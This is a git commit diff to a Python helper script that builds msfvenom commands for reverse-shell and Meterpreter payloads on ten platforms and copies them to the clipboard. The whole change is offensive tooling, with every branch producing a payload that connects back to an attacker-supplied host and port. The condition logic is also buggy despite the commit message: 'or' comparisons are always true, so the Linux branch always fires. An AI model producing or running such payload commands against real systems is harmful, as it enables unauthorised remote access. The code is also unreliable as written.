9fdfe6721da792567829300bccb3e43defc81115
Cameron Mkj <cameronmkj@gmail.com>
2018-02-05 01:55:19 +0000

    If statement not working, clarity improved.
    Added a printline depending on the script selected, allowing me to bug fix faster and allowing the user to have higher clarity of which script that have used.

--- msfconsole.py
+++ msfconsole.py
@@ -14,48 +14,58 @@ while(looper):
 	payloadType = raw_input("Linux, Windows, Mac, PHP, ASP, JSP, WAR, Python, Bash, Perl? ")
 	payloadTypeNew = payloadType.lower()
 
-if payloadType.lower() == "linux" or "lin":
-	pyperclip.copy("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f elf > payload.elf")
-	looper = False
+	if payloadTypeNew == "linux" or "lin":
+		pyperclip.copy("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f elf > payload.elf")
+		looper = False
+		print("Linux Reverse Shell Generated!")
 
-elif payloadType.lower() == "windows" or "win":
-	pyperclip.copy("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f exe > payload.exe")
-	looper = False
+	elif payloadTypeNew == "windows" or "win":
+		pyperclip.copy("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f exe > payload.exe")
+		looper = False
+		print("Windows Reverse Shell Generated!")
 
-elif payloadType.lower() == "mac":
-	pyperclip.copy("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f macho > payload.macho")
-	looper = False
+	elif payloadTypeNew == "mac":
+		pyperclip.copy("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f macho > payload.macho")
+		looper = False
+		print("Mac Reverse Shell Generated!")
 
-elif payloadType.lower() == "php":
-	pyperclip.copy("msfvenom -p php/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.php")
-	looper = False
+	elif payloadTypeNew == "php":
+		pyperclip.copy("msfvenom -p php/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.php")
+		looper = False
+		print("PHP Reverse Shell Generated!")
 
-elif payloadType.lower() == "asp":
-	pyperclip.copy("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f asp > payload.asp")
-	looper = False
+	elif payloadTypeNew == "asp":
+		pyperclip.copy("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f asp > payload.asp")
+		looper = False
+		print("ASP Reverse Shell Generated!")
 
-elif payloadType.lower() == "jsp":
-	pyperclip.copy("msfvenom -p jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.jsp")
-	looper = False
+	elif payloadTypeNew == "jsp":
+		pyperclip.copy("msfvenom -p jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.jsp")
+		looper = False
+		print("JSP Reverse Shell Generated!")
 
-elif payloadType.lower() == "war":
-	pyperclip.copy("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f war > payload.war")
-	looper = False
+	elif payloadTypeNew == "war":
+		pyperclip.copy("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f war > payload.war")
+		looper = False
+		print("WAR Reverse Shell Generated!")
 
-elif payloadType.lower() == "python" or "py":
-	pyperclip.copy("msfvenom -p cmd/unix/reverse_python LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.py")
-	looper = False
+	elif payloadTypeNew == "python" or "py":
+		pyperclip.copy("msfvenom -p cmd/unix/reverse_python LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.py")
+		looper = False
+		print("Python Reverse Shell Generated!")
 
-elif payloadType.lower() == "bash":
-	pyperclip.copy("msfvenom -p cmd/unix/reverse_bash LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.sh")
-	looper = False
+	elif payloadTypeNew == "bash":
+		pyperclip.copy("msfvenom -p cmd/unix/reverse_bash LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.sh")
+		looper = False
+		print("Bash Reverse Shell Generated!")
 
-elif payloadType.lower() == "perl" or "per":
-	pyperclip.copy("msfvenom -p cmd/unix/reverse_perl LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.pl")
-	looper = False
+	elif payloadTypeNew == "perl" or "per":
+		pyperclip.copy("msfvenom -p cmd/unix/reverse_perl LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.pl")
+		looper = False
+		print("Perl Reverse Shell Generated!")
 
-else:
-	print("Unrecognised file type, please try again!")
+	else:
+		print("Unrecognised file type, please try again!")
 
 print("-" * 60)
 print("The Requested Script Has Been Copied To Your Clipboard")
